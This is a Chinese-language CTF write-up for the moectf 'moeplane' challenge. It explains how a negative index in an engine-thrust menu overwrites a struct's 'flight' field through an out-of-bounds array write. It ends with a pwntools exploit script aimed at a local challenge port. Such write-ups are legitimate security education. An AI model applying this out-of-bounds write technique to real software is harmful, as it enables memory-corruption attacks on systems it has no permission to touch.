# moectf moeplane

by Maple

***数组越界覆盖***

盲打的题，很有意思，好像还有点拼手速（脚本就不需要手速了）

```shell
The plane is about to crash. Do something!
[CTR] Fly to airport at 69259509840.
[Meters]
  Altitude: 10000
  Velocity: 300
  Bank angle: 0
  Thrust: engine#1: 20; engine#2: 20; engine#3: 20; engine#4: 20;
[Navigator]
  Flight: 0
  Target: 69259509840
[MoePlane Console]
  0. Check the meters.
  1. Adjust engine thrust.
  2. Adjust trim.
  3. Win the game!
Make your choice:
>
```

连接之后会有这些显示，进行一番尝试之后只发现`1. Adjust engine thrust`有点可疑，因为似乎有修改数据的权限

```shell
Make your choice:
> 1
Which engine?
> -1
Thrust in percentage (0 ~ 100).
> 1
Adjusting engine#-1's thrust to 1[INFO] Done.
```

直接盲猜有负数的非预期输入，结果还真是，那接下来就很好解决了

看下题目给我们的提示：

```c
struct airplane {
    long flight;
    int altitude; // 4 字节
    int velocity; // 4 字节
    int angle;    // 4 字节
    unsigned char engine_thrust[ENGINES]; // 距离 `flight` 12 字节
} moeplane;
```

我们输入的地方是`engine_thrust[ENGINES]`是一个数组元素，根据数组寻址的特性（基址+偏移），我们可以通过输入负数往上方数据写，把flight给覆盖掉，成为目标距离`69259509840`(等效十六进制0x1020304050)

同时别忘了小端序（这个不知道？看csapp去吧），并且flight为`long型（8字节）`，所以我们应该把flight改写为

`50 40 30 20 10 00 00 00`

分别对应`engine_thrust`基地址的

`-20 -19 -18 -17 -16 -15 -14 -13`

然后然后，这道题还有个`输入 - 1`在里面，坑人一把，所以应该输入的时候`+1`

exp：

```python
from pwn import *
context(arch='amd64',log_level='debug')
p = remote('127.0.0.1',64479)
p.sendlineafter(b'>',b'1')
p.sendlineafter(b'>',b'-15')
p.sendlineafter(b'>',b'16')
p.sendlineafter(b'>',b'1')
p.sendlineafter(b'>',b'-16')
p.sendlineafter(b'>',b'32')
p.sendlineafter(b'>',b'1')
p.sendlineafter(b'>',b'-17')
p.sendlineafter(b'>',b'48')
p.sendlineafter(b'>',b'1')
p.sendlineafter(b'>',b'-18')
p.sendlineafter(b'>',b'64')
p.sendlineafter(b'>',b'1')
p.sendlineafter(b'>',b'-19')
p.sendlineafter(b'>',b'80')
p.interactive()
```

（手动输入应该也行，似乎有些拼手速）

